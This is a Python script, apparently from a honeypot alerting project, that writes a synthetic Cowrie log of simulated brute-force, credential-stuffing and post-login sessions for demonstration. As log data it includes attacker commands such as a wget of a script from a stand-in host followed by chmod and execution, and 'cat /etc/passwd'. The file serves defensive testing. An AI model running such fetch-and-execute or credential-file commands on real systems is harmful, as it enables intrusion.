"""Genera un cowrie.json sintético (con timestamps recientes) para demostrar el sistema sin
esperar ataques reales ni correr los contenedores atacantes.

    python -m hp.tools.gen_log --out /data/cowrie/cowrie.json --seed 7

Los episodios terminan "hace unos segundos", así que el motor ASI los ve dentro de sus
ventanas de 15 y 60 minutos y genera las alertas correspondientes.
"""
from __future__ import annotations

import argparse
import hashlib
import os
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

from ..evaluation import scenarios as sc
from . import cowrie_format as cf

SINKHOLE_SHA = hashlib.sha256(b"#!/bin/sh\necho sinkhole\n").hexdigest()


def _episodios_demo(rng: random.Random) -> list[sc.Episodio]:
    def uno(gen, ip, **fix):
        e = gen(rng, ip)
        return e

    eps = [uno(sc.sondeo, "198.51.100.11"), uno(sc.manual, "198.51.100.12"),
           uno(sc.manual, "198.51.100.13"), uno(sc.error_tipeo, "198.51.100.14"),
           uno(sc.monitor, "198.51.100.15"), uno(sc.rafaga_corta, "198.51.100.16"),
           uno(sc.stuffing, "203.0.113.21"), uno(sc.stuffing, "203.0.113.22"),
           uno(sc.bruta_persistente, "203.0.113.23")]
    # fuerza bruta lenta que sí cabe en la ventana de 60 min
    while True:
        lenta = sc.bruta_lenta(rng, "203.0.113.24")
        if 110 <= len(lenta.intentos) and lenta.duracion <= 3500:
            break
    eps.append(lenta)
    return eps


def lineas_de(ep: sc.Episodio, fin: datetime, rng: random.Random) -> list[tuple[datetime, str]]:
    ini = fin - timedelta(seconds=ep.duracion)
    ip = ep.ip
    out: list[tuple[datetime, str]] = []
    if not ep.intentos:   # sondeo: conexión + banner, sin login
        sid = cf.session_id(rng)
        out += [(fin, cf.connect(sid, fin, ip, rng.randint(32768, 60999))),
                (fin + timedelta(seconds=1), cf.closed(sid, fin + timedelta(seconds=1), ip, 1.0))]
        return out
    for i in range(0, len(ep.intentos), 6):          # una sesión cada 6 intentos (MaxAuthTries)
        bloque = ep.intentos[i:i + 6]
        sid = cf.session_id(rng)
        t0 = ini + timedelta(seconds=bloque[0][0]) - timedelta(milliseconds=300)
        out.append((t0, cf.connect(sid, t0, ip, rng.randint(32768, 60999))))
        for seg, u, p in bloque:
            t = ini + timedelta(seconds=seg)
            out.append((t, cf.login(sid, t, ip, u, p)))
        t_fin = ini + timedelta(seconds=bloque[-1][0] + 0.5)
        out.append((t_fin, cf.closed(sid, t_fin, ip, (t_fin - t0).total_seconds())))
    if ep.escenario == "fuerza_bruta_persistente":   # el atacante "entra" y ejecuta comandos
        sid = cf.session_id(rng)
        t = fin + timedelta(seconds=2)
        out.append((t, cf.connect(sid, t, ip, 55555)))
        t += timedelta(seconds=1)
        out.append((t, cf.login(sid, t, ip, "root", "toor-honeypot", ok=True)))
        for cmd in ("uname -a", "cat /proc/cpuinfo", "wget http://files.example.test/x.sh",
                    "chmod +x x.sh", "./x.sh"):
            t += timedelta(seconds=1.5)
            out.append((t, cf.command(sid, t, ip, cmd)))
            if cmd.startswith("wget"):
                t += timedelta(seconds=0.5)
                out.append((t, cf.download(sid, t, ip, "http://files.example.test/x.sh", SINKHOLE_SHA)))
        t += timedelta(seconds=2)
        out.append((t, cf.closed(sid, t, ip, 9.0)))
    return out


_CMDS_BOT = ["uname -a", "cat /proc/cpuinfo", "free -m", "whoami", "ls -la /root", "cat /etc/passwd"]


def historico(rng: random.Random, ahora: datetime, horas: int, n: int) -> list[tuple[datetime, str]]:
    """Sesiones de fondo repartidas en las últimas `horas` (con picos), SSH y Telnet, algunas con comandos."""
    pesos = [1 + 2.2 * max(0.0, 1 - abs(h - 8) / 3) + 1.8 * max(0.0, 1 - abs(h - 20) / 3) for h in range(24)]
    pool = ([f"203.0.113.{i}" for i in range(30, 70)] + [f"198.51.100.{i}" for i in range(30, 70)]
            + [f"192.0.2.{i}" for i in range(10, 60)])
    out: list[tuple[datetime, str]] = []
    for _ in range(n):
        h = rng.choices(range(24), weights=pesos)[0]
        t = ahora - timedelta(hours=horas) + timedelta(hours=h * horas / 24, seconds=rng.uniform(0, 3600 * horas / 24))
        if t > ahora - timedelta(minutes=70):      # que no interfiera con las ventanas del motor
            t -= timedelta(hours=2)
        ip, proto = rng.choice(pool), ("telnet" if rng.random() < 0.3 else "ssh")
        sid = cf.session_id(rng)
        out.append((t, cf.connect(sid, t, ip, rng.randint(32768, 60999), proto)))
        for _i in range(rng.randint(1, 5)):
            t += timedelta(seconds=rng.uniform(0.6, 2.5))
            out.append((t, cf.login(sid, t, ip, rng.choice(["root", "admin", "user", "ubuntu", "test", "pi"]),
                                    rng.choice(["123456", "password", "admin", "root", "1234", "toor"]))))
        if rng.random() < 0.18:                    # entra y ejecuta algo
            t += timedelta(seconds=1)
            out.append((t, cf.login(sid, t, ip, "root", "toor-honeypot", ok=True)))
            for cmd in rng.sample(_CMDS_BOT, rng.randint(1, 3)):
                t += timedelta(seconds=rng.uniform(1, 3))
                out.append((t, cf.command(sid, t, ip, cmd)))
        t += timedelta(seconds=2)
        out.append((t, cf.closed(sid, t, ip, rng.uniform(3, 40))))
    return out


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
    ap.add_argument("--out", required=True)
    ap.add_argument("--seed", type=int, default=7)
    ap.add_argument("--historico-horas", type=int, default=0, help="además, sesiones de fondo repartidas en las últimas N horas")
    ap.add_argument("--n-fondo", type=int, default=600)
    a = ap.parse_args()
    rng = random.Random(a.seed)
    ahora = datetime.now(timezone.utc)
    lineas: list[tuple[datetime, str]] = []
    for ep in _episodios_demo(rng):
        fin = ahora - timedelta(seconds=rng.uniform(8, 20))
        lineas += lineas_de(ep, fin, rng)
    if a.historico_horas:
        lineas += historico(rng, ahora, a.historico_horas, a.n_fondo)
    lineas.sort(key=lambda x: x[0])
    path = Path(a.out)
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "a", encoding="utf-8") as fh:
        for _, ln in lineas:
            fh.write(ln + "\n")
    try:  # que Cowrie (otro usuario) pueda seguir escribiendo en el mismo archivo
        os.chmod(path, 0o666)
    except OSError:
        pass
    print(f"{len(lineas)} eventos escritos en {path}")


if __name__ == "__main__":
    main()
